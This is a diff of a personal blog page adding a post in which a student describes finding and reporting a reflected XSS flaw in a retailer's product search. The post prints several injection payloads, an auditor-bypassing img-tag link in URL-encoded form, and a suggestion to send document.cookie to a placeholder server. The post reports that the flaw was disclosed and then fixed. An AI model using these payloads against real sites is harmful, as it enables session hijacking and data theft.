@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width initial-scale=1" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-  <title>Categories</title>
+  <title>(First) Reflected XSS</title>
   <meta name="description" content="Tech junkie • Security enthousiast • Computer Science @ VUBrussels">
   <meta name="author" content="Vincent De Schutter">
   <meta name="HandheldFriendly" content="True">
@@ -43,7 +43,7 @@
   <meta name="theme-color" content="#ffffff">
 
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://localhost:4000//categories/">
+  <link rel="canonical" href="http://localhost:4000//first-xss/">
   <link rel="alternate" type="application/rss+xml" title="Vincent De Schutter" href="/feed.xml">
 </head>
 
@@ -152,34 +152,93 @@
 
     <div class="content-wrapper">
       <div class="content-wrapper__inner">
-        <h2>Categories:</h2>
-<div class="categories"> 
- 
-  <a href="#jekyll">jekyll</a>
+        <article class="post-container post-container--single">
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="2 Apr 2016" class="post-meta__date date">2 Apr 2016</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#xss">xss</a> </span>
+    </div>
+    <h1 class="post-title">(First) Reflected XSS</h1>
+  </header>
 
-</div>
+  <section class="post">
+    <p>A few weeks ago, I took part in the <a href="https://www.cybersecuritychallenge.be/">Cyber Security Challenge Belgium</a>, an annual CTF hosted by <a href="https://www.nviso.be/">NVISO</a> intended for Belgian students to test their security knowledge. After talking with some experienced security researchers, they convinced me to start bug hunting. They advised me to start seeking for vulnerabilities on small independent websites instead of hunting large programs on <a href="https://hackerone.com/">HackerOne</a> and <a href="https://bugcrowd.com">Bugcrowd</a>.</p>
 
-<!-- iterate through all categories on the site --> 
- 
-  <!-- for each tag, create an anchor by using the tag name as an id --> 
-  <div id="jekyll">  
-    <h3> jekyll </h3>  <!-- for create a heading --> 
+<p>After crawling over various websites, I noticed some strange behaviour on the website of <a href="https://www.brouwland.com/en">Brouwland</a>. Users are able to search for products by using the query input form. Since the resulting page includes the query string, I checked whether it was vulnerable to reflected XSS by entering some special characters.</p>
 
-    <ul> <!-- create the list of posts -->
-      <!-- iterate through all the posts on the site --> 
-       
-        <!-- list only those which contain the current tag --> 
-        
-       
-        <!-- list only those which contain the current tag --> 
-         
-            <li>
-              <a href="/welcome-to-jekyll/">Welcome to Jekyll!</a>
-            </li>
-        
-      
-    </ul>
-  </div>
+<p>The query <code class="highlighter-rouge">XSS"&gt;</code> returned the following page:</p>
+
+<p><a href="http://localhost:4000/images/posts/first-xss-1.png"><img src="http://localhost:4000/images/posts/first-xss-1.png" alt="" /></a></p>
+
+<p>Surprisingly, the double quote and closing tag were not being escaped. HTML escaping exists in transforming special characters allowing the browser to interpret them as text instead of HTML code, which makes XSS impossible. Input which does not gets escaped? This seemed to easy. If I just close the current tag using <code class="highlighter-rouge">&lt;/*&gt;</code>, I could append my malicious script which will be executed by the browser. For example:</p>
+
+<p><code class="highlighter-rouge">test&lt;/p&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+
+<p>Unfortunately, the input starting from the closing tags gets omitted in the returning string. Only <code class="highlighter-rouge">test</code> was reflected in the returning string. This technique, also known as sanitizing, is another common way to prevent XSS. Thus, these fields are invulnerable to XSS.</p>
+
+<p>After analysing the source code for a second time, I found a more interesting place which reflected my query. The user can filter his search results using the buttons next to the search field. After querying, these buttons contain an href attribute which will execute a filtered search. For example, given input ‘XSS’:</p>
+
+<p><a href="http://localhost:4000/images/posts/first-xss-2.png"><img src="http://localhost:4000/images/posts/first-xss-2.png" alt="" /></a></p>
+
+<p>A quick test reveals the input is neither escaped nor sanitized. Bazinga! Let’s just exit the current tag and inject our script using the following query:</p>
+
+<p><code class="highlighter-rouge">XSS"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+
+<p>However, this is detected by Google Chrome’s XSS auditor. The auditor identifies malicious request parameters and blocks the response if it believes the code is injected in the response.</p>
+
+<p>Time to craft another query:</p>
+
+<p><code class="highlighter-rouge">XSS"&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;img src="http://www.maliciouslink.com"&gt;&lt;/li&gt;&lt;li&gt;&lt;a class="btn btn-default" href="</code></p>
+
+<p>Yay, this is accepted! Using URL encoding, we could create the following link:</p>
+
+<div style="overflow-x: auto; overflow-y: hidden; white-space: nowrap; font-style: italic;">www.brouwland.com%2Fen%2Fsearch%3Fq%3DXSS%22%20%3E%3C%2Fa%3E%3C%2Fli%3E%3Cli%3E%3Cimg%20src%3D%22http%3A%2F%2Fwww.maliciouslink.com%22%3E%3C%2Fli%3E%3Cli%3E%3Ca%20class%3D%22btn%20btn-default%22%20href%3D%22</div>
+
+<p><br />
+This results in the following source code:</p>
+
+<p><a href="http://localhost:4000/images/posts/first-xss-3.png"><img src="http://localhost:4000/images/posts/first-xss-3.png" alt="" /></a></p>
+
+<p>The page looked like this:</p>
+
+<p><a href="http://localhost:4000/images/posts/first-xss-4.png"><img src="http://localhost:4000/images/posts/first-xss-4.png" alt="" /></a></p>
+
+<p>Hence, clicking the link will result in a request to <code class="highlighter-rouge">www.maliciouslink.com</code>. Although this does not seem malicious, we could replace this link with <code class="highlighter-rouge">www.yourserver.com/cookie?+document.cookie</code> to send the cookie of an authenticated user to your server and hijack their session. Another possible exploit is to use the onerror attribute in the img tag to execute some arbitrary JavaScript code:</p>
+
+<p><code class="highlighter-rouge">&lt;img src=x onerror=alert('XSS') /&gt;</code></p>
+
+<p>There are probably a dozen ways to exploit this vulnerability, however I reported it shortly after I found out the input did not get escaped or sanitized. Their team fixed the bug two days later and thanked me for my findings. Overall, it was a fun and easy first bug. Hopefully this is the start of many other bug discoveries!</p>
+
+
+  </section>
+  <section id="disqus_thread"></section><!-- /#disqus_thread -->
+</article>
+
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vincentdsblog'; // required: replace example with your forum shortname
+        var disqus_config = function () {
+          this.page.url = 'http://localhost:4000/first-xss/';
+          this.page.identifier = '/first-xss';
+          this.page.title = '(First) Reflected XSS';
+        };
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function () {
+            var s = document.createElement('script'); s.async = true;
+            s.type = 'text/javascript';
+            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+        }());
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
 
       </div>
 
